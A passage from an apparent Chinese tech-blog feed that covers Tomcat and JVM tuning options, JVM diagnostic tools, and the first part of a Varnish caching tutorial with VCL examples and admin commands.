class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JAVA_OPTS=&quot;-server -Xms32g -Xmx32g -XX:NewSize= -XX:MaxNewSize= &quot;</span><br><span class="line">-server：服务器模式</span><br><span class="line">-Xms：堆内存初始化大小；</span><br><span class="line">-Xmx：堆内存空间上限；</span><br><span class="line">-XX:NewSize=：新生代空间初始化大小；</span><br><span class="line">-XX:MaxNewSize=：新生代空间最大值；</span><br></pre></td></tr></table></figure><p>线程池设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;  connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt;</span><br><span class="line">maxThreads：最大线程数；</span><br><span class="line">minSpareThreads：最小空闲线程数；</span><br><span class="line">maxSpareThreads：最大空闲线程数；</span><br><span class="line">acceptCount：等待队列的最大长度；</span><br><span class="line">URIEncoding：URI地址编码格式，建议使用UTF-8；</span><br><span class="line">enableLookups：是否启用dns解析，建议禁用； </span><br><span class="line">compression：是否启用传输压缩机制，建议“on&quot;;</span><br><span class="line">compressionMinSize：启用压缩传输的数据流最小值，单位是字节；</span><br><span class="line">compressableMimeType：定义启用压缩功能的MIME类型；</span><br><span class="line">text/html, text/xml, text/css, text/javascript</span><br></pre></td></tr></table></figure><p>禁用8005端口；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Server port=&quot;-1&quot; shutdown=&quot;SHUTDOWN&quot;&gt;</span><br></pre></td></tr></table></figure><p>隐藏版本信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;  connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt;</span><br><span class="line">Server=&quot;SOME STRING&quot;</span><br></pre></td></tr></table></figure><h1 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h1><p>内存分配参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-Xmx：堆内存（新生代和老年代）的最大空间；</span><br><span class="line">-Xms：初始分配内存空间；</span><br><span class="line">-XX:NewSize：新生代空间大小；</span><br><span class="line">    -Xms-(-XX:NewSize)</span><br><span class="line">-XX:MaxNewSize：新生代的最大空间；</span><br><span class="line">    -Xmx-（-XX:MaxNewSize）</span><br></pre></td></tr></table></figure><p>指定垃圾收集器：-XX:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">UseSerialGC：运行于Client模式下，新生代是Serial, 老年代使用SerialOld</span><br><span class="line">UseParNewGC：新生代使用ParNew，老年代使用SerialOld</span><br><span class="line">UseParalellGC：运行于server模式下，新生代使用Serial Scavenge, 老年代使用SerialOld</span><br><span class="line">UseParalessOldGC：新生代使用Paralell Scavenge, 老年代使用Paralell Old</span><br><span class="line">UseConcMarkSweepGC：新生代使用ParNew, 老年代优先使用CMS，备选方式为Serial Old</span><br><span class="line">    CMSInitiatingOccupancyFraction：设定老年代空间占用比例达到多少后触发回收操作，默认为68%；</span><br><span class="line">    UseCMSCompactAtFullCollection：CMS完成内存回收后是否要进行内存碎片整理；</span><br><span class="line">    CMSFullGCsBeforeCompaction：在多次回收后执行一次内存碎片整理；</span><br><span class="line">ParalellGCThreads：并行GC线程的数量；</span><br></pre></td></tr></table></figure><p>JVM常用的分析工具：</p><ul><li>jps：用来查看运行的所有jvm进程；</li><li>jinfo：查看进程的运行环境参数，主要是jvm命令行参数；</li><li>jstat：对jvm应用程序的资源和性能进行实时监控；</li><li>jstack：查看所有线程的运行状态；</li><li>jmap：查看jvm占用物理内存的状态；</li><li>jhat：+UseParNew</li><li>jconsole：</li><li>jvisualvm：</li></ul><p><strong>jps</strong>：Java virutal machine Process Status tool</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jps [-q] [-mlvV] [&lt;hostid&gt;]</span><br><span class="line">-q：静默模式；</span><br><span class="line">-v：显示传递给jvm的命令行参数；</span><br><span class="line">-m：输出传入main方法的参数；</span><br><span class="line">-l：输出main类或jar完全限定名称；</span><br><span class="line">-V：显示通过flag文件传递给jvm的参数；</span><br><span class="line">[&lt;hostid&gt;]：主机id，默认为localhost；</span><br></pre></td></tr></table></figure><p><strong>jinfo</strong>：输出给定的java进程的所有配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jinfo [option] &lt;pid&gt;</span><br><span class="line">-flags：to print VM flags</span><br><span class="line">-sysprops：to print Java system properties</span><br><span class="line">-flag &lt;name&gt;：to print the value of the named VM flag</span><br></pre></td></tr></table></figure><p><strong>jstack</strong>：查看指定的java进程的线程栈的相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jstack [-l] &lt;pid&gt;</span><br><span class="line">jstack -F [-m] [-l] &lt;pid&gt;</span><br><span class="line">-l：long listings，会显示额外的锁信息，因此，发生死锁时常用此选项；</span><br><span class="line">-m：混合模式，既输出java堆栈信息，也输出C/C++堆栈信息；</span><br><span class="line">-F：当使用“jstack -l PID&quot;无响应，可以使用-F强制输出信息；</span><br></pre></td></tr></table></figure><p><strong>jstat</strong>：输出指定的java进程的统计信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">jstat -&lt;option&gt; [-t] [-h&lt;lines&gt;] &lt;vmid&gt; [&lt;interval&gt; [&lt;count&gt;]]</span><br><span class="line">-option：</span><br><span class="line">-class：class loader</span><br><span class="line">-compiler：JIT</span><br><span class="line">-gc：gc</span><br><span class="line">YGC：新生代的垃圾回收次数；</span><br><span class="line">YGCT：新生代垃圾回收消耗的时长；</span><br><span class="line">FGC：Full GC的次数；</span><br><span class="line">FGCT：Full GC消耗的时长；</span><br><span class="line">GCT：GC消耗的总时长；</span><br><span class="line">-gccapacity：统计堆中各代的容量</span><br><span class="line">-gccause：</span><br><span class="line">-gcmetacapacity</span><br><span class="line">-gcnew：新生代</span><br><span class="line">-gcnewcapacity</span><br><span class="line">-gcold：老年代</span><br><span class="line">-gcoldcapacity</span><br><span class="line">-gcutil</span><br><span class="line">-printcompilation</span><br><span class="line">interval：时间间隔，单位是毫秒；</span><br><span class="line">count：显示的次数；</span><br></pre></td></tr></table></figure><p><strong>jmap</strong>：Memory Map, 用于查看堆内存的使用状态</p><p><strong>jhat</strong>：Java Heap Analysis Tool</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jmap [option] &lt;pid&gt;</span><br><span class="line">jmap -heap &lt;pid&gt;  #查看堆空间的详细信息</span><br><span class="line">jmap -histo[:live] &lt;pid&gt;  #查看堆内存中的对象的数目,live：只统计活动对象</span><br><span class="line">jmap -dump:&lt;dump-options&gt; &lt;pid&gt;  #保存堆内存数据至文件中，而后使用jvisualvm或jhat进行查看</span><br><span class="line">dump-options:</span><br><span class="line">live       </span><br><span class="line">format=b</span><br><span class="line">file=&lt;file&gt;</span><br></pre></td></tr></table></figure><p>感谢阅读！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="server" scheme="https://fenghong.tech/tags/server/"/>
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="internet" scheme="https://fenghong.tech/tags/internet/"/>
    
      <category term="proxy" scheme="https://fenghong.tech/tags/proxy/"/>
    
  </entry>
  
  <entry>
    <title>Varnish</title>
    <link href="https://fenghong.tech/varnish.html"/>
    <id>https://fenghong.tech/varnish.html</id>
    <published>2018-07-15T11:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>摘要：</p><ul><li>缓存相关的概念</li><li>varnish的介绍</li><li>varnish的管理及配置</li><li>多主机调度功能实现</li><li>ansible实现varnish</li></ul><h1 id="缓存相关概念简述"><a href="#缓存相关概念简述" class="headerlink" title="缓存相关概念简述"></a>缓存相关概念简述</h1><ul><li>时间局部性：一个数据被访问过之后，可能很快会被再次访问到；</li><li>空间局部性：一个数据被访问时，其周边的数据也有可能被访问到</li><li>数据缓存：例如MySQL到web应用服务器之间的缓存服务器缓存的资源是数据缓存</li></ul><ul><li>页面缓存：接入层和应用层中间的缓存服务器缓存的是可缓存的页面，这层就是缓存层</li><li>缓存命中率：hit/(hit+miss)，一般高于30%命中率则是正向收益，好的设计系统可以达到80%到95%以上</li><li>字节命中率：按照数据的字节大小来计算命中率</li><li>请求命中率：按照请求的数量来计算命中率</li><li>代理式缓存：客户端访问缓存服务器，缓存服务器没有命中缓存时到后端服务器请求数据，此时它作为反向代理服务器工作，这种类型的缓存服务器叫做代理式缓存</li><li>旁挂式缓存：客户端亲自去查询数据库，并且将数据复制给缓存服务器一份，下次先去找缓存服务器，如果没有命中则再去数据库服务器查询，此时这种工作方式的缓存叫做旁挂式缓存，这个客户端叫做胖客户端（smart client）</li><li>private cache：私有缓存，用户代理附带的本地缓存机制</li><li>public cache：公共缓存，反向代理服务器的缓存功能</li><li>CND：Content Delivery Network 内容投递系统</li><li>GSLB：全网均衡调度</li><li>缓存有效性判断机制：<ul><li>过期时间</li><li>条件式验证<ul><li>Last-Modified/If-Modified-Since：基于文件的修改时间戳来判别</li><li>Etag/If-None-Match：基于文件的校验码来判别</li></ul></li></ul></li></ul><blockquote><p><strong>过期时间验证</strong>缓存是否失效颗粒度太大，如果页面刚刚缓存应用服务器发生了变化，结果客户端拿到的就是过期数据；从而加入了<strong>条件式验证</strong>缓存的失效性，每次客户端请求到达缓存服务器，缓存服务器都要拿本地的数据和应用服务器的数据比较时间戳，如果时间戳发生了变化则缓存新的数据；这样虽然粒度小了，但是还是会有问题，如果应用服务器在同一秒页面数据变化了三次，而缓存服务器拿到的是第一份数据，这样还是会发生数据失效的问题；从而又引入了<strong>Etag（扩展标记）</strong>来标记唯一的页面数据。此时虽然解决了数据失效性的问题，但是每次客户端的请求都要去后端服务器做比较，对缓存和应用服务器都是不小的压力，我们不得不采取折中的解决方案就是“过期时间验证+条件式验证”，将不经常变动的页面做过期时间验证，变动频繁的采用条件式验证。</p></blockquote><p>请求报文用于通知缓存服务如何使用缓存响应请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cache-request-directive = </span><br><span class="line">&quot;no-cache&quot; 不能使用缓存系统中的缓存响应我，必须先去应用服务器做缓存验证</span><br><span class="line">&quot;no-store&quot; 不能使用缓存系统中的缓存响应我，必须去应用服务器请求响应我</span><br><span class="line">&quot;max-age&quot; &quot;=&quot; delta-seconds </span><br><span class="line">&quot;max-stale&quot; [ &quot;=&quot; delta-seconds ]</span><br><span class="line">&quot;min-fresh&quot; &quot;=&quot; delta-seconds</span><br><span class="line">&quot;no-transform&quot;</span><br><span class="line">&quot;only-if-cached&quot;</span><br><span class="line">cache-extension</span><br></pre></td></tr></table></figure><p>响应报文用于通知缓存服务器如何存储上级服务器响应的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cache-response-directive =</span><br><span class="line">&quot;public&quot; 所有缓存系统都可以缓存</span><br><span class="line">&quot;private&quot; [ &quot;=&quot; &lt;&quot;&gt; 1#field-name &lt;&quot;&gt; ] 仅能够被私有缓存所缓存</span><br><span class="line">&quot;no-cache&quot; [ &quot;=&quot; &lt;&quot;&gt; 1#field-name &lt;&quot;&gt; ]，可缓存，但响应给客户端之前需要revalidation，即必须发出条件式请求进行缓存有效性验正</span><br><span class="line">&quot;no-store&quot; ，不允许存储响应内容于缓存中</span><br><span class="line">&quot;no-transform&quot; 不能转换格式</span><br><span class="line">&quot;must-revalidate&quot; 必须重新验证</span><br><span class="line">&quot;proxy-revalidate&quot; </span><br><span class="line">&quot;max-age&quot; &quot;=&quot; delta-seconds 私有缓存最大缓存时长</span><br><span class="line">&quot;s-maxage&quot; &quot;=&quot; delta-seconds 公共缓存最大缓存时长</span><br><span class="line">cache-extension</span><br></pre></td></tr></table></figure><blockquote><p>Web Page Cache解决方案：squid和varnish，它们的关系就像Apache和Nginx</p></blockquote><h1 id="varnish介绍"><a href="#varnish介绍" class="headerlink" title="varnish介绍"></a>varnish介绍</h1><p>Varnish cache，或称Varnish，是一套高性能的反向网站缓存服务器（reverse proxy server）</p><p>varnish官方站点： <a href="http://www.varnish-cache.org/" target="_blank" rel="noopener">http://www.varnish-cache.org/</a></p><blockquote><p>varnish拥有俩套配置文件；一套配置文件用于varnish自身进程的参数配置，另一套用于定义缓存规则；定义缓存规则需要使用灵活的语言来定义，这就是VCL（varnish语言）；应用时需要将VCL编写的规则送给VCC编译后才能运行，所以安装varnish需要依赖gcc编译器。</p></blockquote><p>varnish的安装：<code>yum install varnish -y</code>，依赖epel源，目前CentOS7的epel源提供的版本是v4.0.5</p><p>varnish的程序环境：</p><ul><li><code>/etc/varnish/varnish.params</code>： 配置varnish服务进程的工作特性，例如监听的地址和端口，缓存机制</li><li><code>/etc/varnish/default.vcl</code>：配置各Child/Cache线程的缓存策略</li><li><code>/usr/sbin/varnishd</code>：主程序</li><li><code>/usr/bin/varnishadm</code>：命令行工具</li><li><code>/usr/bin/varnishhist</code>：</li><li><code>/usr/bin/varnishlog</code>：查看内存中的日志</li><li><code>/usr/bin/varnishncsa</code>：以NCSA格式查看日志</li><li><code>/usr/bin/varnishstat</code>：查看缓存日志状态信息</li><li><code>/usr/bin/varnishtop</code>：以rank方式查看日志</li><li><code>/usr/bin/varnishtest</code>：测试工具程序</li><li><code>/usr/sbin/varnish_reload_vcl</code>：VCL配置文件重载程序</li><li><code>/usr/lib/systemd/system/varnish.service</code>：varnish服务</li><li><code>/usr/lib/systemd/system/varnishlog.service</code>：日志持久的服务</li><li><code>/usr/lib/systemd/system/varnishncsa.service</code>：日志持久的服务</li></ul><h2 id="管理工具"><a href="#管理工具" class="headerlink" title="管理工具"></a>管理工具</h2><h3 id="varnishd"><a href="#varnishd" class="headerlink" title="varnishd"></a>varnishd</h3><ul><li>-s [name=]type[,options] ：定义缓存数据的存储方式<ul><li>malloc[,size]：内存存储，[,size]用于定义空间大小；重启后所有缓存项失效</li><li>file[,path[,size[,granularity]]]：磁盘文件存储，黑盒；重启后所有缓存项失效</li><li>persistent,path,size：文件存储，黑盒；重启后所有缓存项有效；实验阶段，不建议使用</li></ul></li><li>-a address[:port][,address[:port][…]：服务监听端口，默认为6081端口</li><li>-T address[:port]：管理服务监听端口，默认为6082端口</li><li>-f config：VCL配置文件</li><li>-F：运行于前台</li><li>-p param=value：设定运行参数及其值； 可重复使用多次</li><li>-r param[,param…]: 设定指定的参数为只读状态</li></ul><h3 id="varnishstat"><a href="#varnishstat" class="headerlink" title="varnishstat"></a>varnishstat</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># varnishstat -1 -f MAIN.cache_hit -f MAIN.cache_miss #显示指定参数的当前统计数据</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># varnishstat -l -f MAIN -f MEMPOOL #列出指定配置段的每个参数的意义</span><br></pre></td></tr></table></figure><h3 id="varnishtop"><a href="#varnishtop" class="headerlink" title="varnishtop"></a>varnishtop</h3><ul><li>-1：打印统计信息一次并退出，而不是持续更新的显示</li><li>-i taglist：可以同时使用多个-i选项，也可以一个选项跟上多个标签</li><li>-I \&lt;[taglist:]regex>：对指定的标签的值基于regex进行过滤</li><li>-x taglist：排除列表</li><li>-X \&lt;[taglist:]regex>：对指定的标签的值基于regex进行过滤，符合条件的予以排除</li></ul><h3 id="varnishadm"><a href="#varnishadm" class="headerlink" title="varnishadm"></a>varnishadm</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># varnishadm -S /etc/varnish/secret -T 127.0.0.1:6082 #登录管理程序</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">help [&lt;command&gt;] 获取帮助</span><br><span class="line">ping [&lt;timestamp&gt;] 测试服务器</span><br><span class="line">auth &lt;response&gt;</span><br><span class="line">quit 退出cli</span><br><span class="line">banner</span><br><span class="line">status 显示状态</span><br><span class="line">start 启动</span><br><span class="line">stop 停止</span><br><span class="line">vcl.load &lt;configname&gt; &lt;filename&gt; 加载VCL配置文件</span><br><span class="line">vcl.inline &lt;configname&gt; &lt;quoted_VCLstring&gt;</span><br><span class="line">vcl.use &lt;configname&gt; 激活VCL配置文件</span><br><span class="line">vcl.discard &lt;configname&gt; 删除VCL配置</span><br><span class="line">vcl.list 列出VCL配置</span><br><span class="line">param.show [-l] [&lt;param&gt;] 列出当前运行的参数</span><br><span class="line">param.set &lt;param&gt; &lt;value&gt; 运行参数临时调整</span><br><span class="line">panic.show</span><br><span class="line">panic.clear</span><br><span class="line">storage.list 列出数据存储信息</span><br><span class="line">vcl.show [-v] &lt;configname&gt; 列出VCL详细配置</span><br><span class="line">backend.list [&lt;backend_expression&gt;] 列出后端服务器</span><br><span class="line">backend.set_health &lt;backend_expression&gt; &lt;state&gt;</span><br><span class="line">ban &lt;field&gt; &lt;operator&gt; &lt;arg&gt; [&amp;&amp; &lt;field&gt; &lt;oper&gt; &lt;arg&gt;]...</span><br><span class="line">ban.list</span><br></pre></td></tr></table></figure><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>默认配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">RELOAD_VCL=1</span><br><span class="line">VARNISH_VCL_CONF=/etc/varnish/default.vcl  #指定加载VCL配置文件</span><br><span class="line">VARNISH_LISTEN_ADDRESS=192.168.1.5  #服务监听的地址</span><br><span class="line">VARNISH_LISTEN_PORT=6081  #默认监听端口</span><br><span class="line">VARNISH_ADMIN_LISTEN_ADDRESS=127.0.0.1  #管理服务监听的地址</span><br><span class="line">VARNISH_ADMIN_LISTEN_PORT=6082 #管理服务监听的端口</span><br><span class="line">VARNISH_SECRET_FILE=/etc/varnish/secret  #连接秘钥</span><br><span class="line">VARNISH_STORAGE=&quot;malloc,256M&quot;  #用内存提供保存缓存,大小为256M</span><br><span class="line">VARNISH_USER=varnish  #用户身份</span><br><span class="line">VARNISH_GROUP=varnish #组身份</span><br><span class="line">DAEMON_OPTS=&quot;-p thread_pool_min=5 -p thread_pool_max=500 -p thread_pool_timeout=300&quot; #指定进程的运行参数</span><br></pre></td></tr></table></figure><h2 id="VCL"><a href="#VCL" class="headerlink" title="VCL"></a>VCL</h2><p>Varnish配置语言（VCL）是一种特定于域的语言，用于描述Varnish Cache的请求处理和文档缓存策略。加载新配置时，由Manager进程创建的VCC进程将VCL代码转换为C.此C代码通常由gcc共享对象编译。然后将共享对象加载到cacher进程中。</p><ul><li>varnish的有限状态机：</li></ul><p>VCL有多个状态引擎，状态之间存在相关性，但状态引擎彼此间互相隔离；每个状态引擎可使用return(x)指明关联至哪个下一级引擎；每个状态引擎对应于vcl文件中的一个配置段，即为subroutine</p><p>俩个特殊的引擎：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vcl_init：在处理任何请求之前要执行的vcl代码：主要用于初始化VMODs；</span><br><span class="line">vcl_fini：所有的请求都已经结束，在vcl配置被丢弃时调用；主要用于清理VMODs；</span><br></pre></td></tr></table></figure><h3 id="vainish默认的VCL配置"><a href="#vainish默认的VCL配置" class="headerlink" title="vainish默认的VCL配置"></a>vainish默认的VCL配置</h3><blockquote><p>默认VCL配置也叫做隐式规则，在配置文件中无法看到，即使我们修改了配置文件，默认配置规则也是在最后做处理。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">varnish&gt; vcl.show -v boot  #在客户端cli工具中查看</span><br><span class="line">sub vcl_recv &#123;</span><br><span class="line">    if (req.method == &quot;PRI&quot;) &#123;  #如果客户端的请求方法是PRI，不支持SPDY或HTTP/2.0</span><br><span class="line">        return (synth(405));  #则构建一个405的包响应给客户端</span><br><span class="line">    &#125;</span><br><span class="line">    if (req.method != &quot;GET&quot; &amp;&amp;  #如果客户端的请求方法不是GET</span><br><span class="line">      req.method != &quot;HEAD&quot; &amp;&amp;  #并且不是HEAD</span><br><span class="line">      req.method != &quot;PUT&quot; &amp;&amp;  #并且不是PUT</span><br><span class="line">      req.method != &quot;POST&quot; &amp;&amp;  #并且不是...</span><br><span class="line">      req.method != &quot;TRACE&quot; &amp;&amp;</span><br><span class="line">      req.method != &quot;OPTIONS&quot; &amp;&amp;</span><br><span class="line">      req.method != &quot;DELETE&quot;) &#123;</span><br><span class="line">        return (pipe);  #即，不是标准HTTP请求方法的交给pipe（管道）</span><br><span class="line">    &#125;</span><br><span class="line">    if (req.method != &quot;GET&quot; &amp;&amp; req.method != &quot;HEAD&quot;) &#123;  #请求方法不是GET和HEAD的</span><br><span class="line">        return (pass);  #交给pass处理，也就是除了GAT和HEAD方法其他的无法缓存</span><br><span class="line">    &#125;</span><br><span class="line">    if (req.http.Authorization || req.http.Cookie) &#123;  #http的请求首部包含Authorization（认证）或Cookie，即个人专有信息</span><br><span class="line">        return (pass);  #交给pass处理，因为这些带有个人信息的数据无法缓存</span><br><span class="line">    &#125;</span><br><span class="line">    return (hash);  #以上的规则都没有做处理的请求交给hash做处理，剩下的是可以查询缓存的请求了</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub vcl_pipe</span><br><span class="line">sub vcl_pass</span><br><span class="line">sub vcl_hash</span><br><span class="line">sub vcl_purge</span><br><span class="line">sub vcl_hit</span><br><span class="line">sub vcl_miss</span><br><span class="line">sub vcl_deliver</span><br><span class="line">sub vcl_synth</span><br><span class="line">sub vcl_backend_fetch</span><br><span class="line">sub vcl_backend_response</span><br><span class="line">sub vcl_backend_error</span><br><span class="line">sub vcl_init</span><br><span class="line">sub vcl_fini</span><br></pre></td></tr></table></figure><h3 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h3><ul><li>regsub(str, regex, sub)</li><li>regsuball(str, regex, sub)</li><li>ban(boolean expression)</li><li>hash_data(input)</li><li>synthetic(str)</li><li>hash_data()：指明哈希计算的数据；减少差异，以提升命中率</li><li>regsub(str,regex,sub)：把str中被regex第一次匹配到字符串替换为sub；主要用于URL Rewrite</li><li>regsuball(str,regex,sub)：把str中被regex每一次匹配到字符串均替换为sub</li><li>return()</li><li>ban(expression) </li><li>ban_url(regex)：Bans所有的其URL可以被此处的regex匹配到的缓存对象</li><li>synth(status,”STRING”)：生成响应报文</li></ul><h3 id="Keywords"><a href="#Keywords" class="headerlink" title="Keywords"></a>Keywords</h3><ul><li>call subroutine</li><li>return(action)</li><li>new</li><li>set</li><li>unset</li></ul><h3 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h3><ul><li>==, !=, ~, &gt;, &gt;=, &lt;, &lt;=</li><li>逻辑操作符：&amp;&amp;, ||, !</li><li>变量赋值：=</li></ul><p><strong>示例1</strong>：obj.hits是内建变量，用于保存某缓存项的从缓存中命中的次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># vim /etc/varnish/varnish.params</span><br><span class="line">VARNISH_LISTEN_PORT=80</span><br><span class="line"># vim /etc/varnish/default.vcl</span><br><span class="line">backend default &#123;</span><br><span class="line">    .host = &quot;192.168.0.9&quot;;</span><br><span class="line">    .port = &quot;80&quot;;</span><br><span class="line">&#125;</span><br><span class="line">sub vcl_deliver &#123;</span><br><span class="line">    if (obj.hits&gt;0) &#123;</span><br><span class="line">        set resp.http.X-Cache = &quot;HIT via&quot; + &quot; &quot; + server.ip;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        set resp.http.X-Cache = &quot;MISS from &quot; + server.ip;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># systemctl restart varnish  #谨慎重启varnish服务，会导致之前的缓存失效</span><br><span class="line"># for i in &#123;1..5&#125;; do curl -I -s 192.168.0.8 |grep &quot;X-Cache&quot;; done  #在客户端测试，第一次Miss</span><br><span class="line">X-Cache: MISS from 192.168.0.8</span><br><span class="line">X-Cache: HIT via 192.168.0.8</span><br><span class="line">X-Cache: HIT via 192.168.0.8</span><br><span class="line">X-Cache: HIT via 192.168.0.8</span><br><span class="line">X-Cache: HIT via 192.168.0.8</span><br></pre></td></tr></table></figure><h3 id="内建变量"><a href="#内建变量" class="headerlink" title="内建变量"></a>内建变量</h3><ul><li>req.*：request，表示由客户端发来的请求报文相关；</li><li>bereq.*：由varnish发往BE主机的httpd请求相关；</li><li>beresp.*：由BE主机响应给varnish的响应报文相关；</li><li>resp.*：由varnish响应给client相关；</li><li>obj.*：存储在缓存空间中的缓存对象的属性；只读；</li></ul><p>常用变量：</p><ul><li>bereq.request, 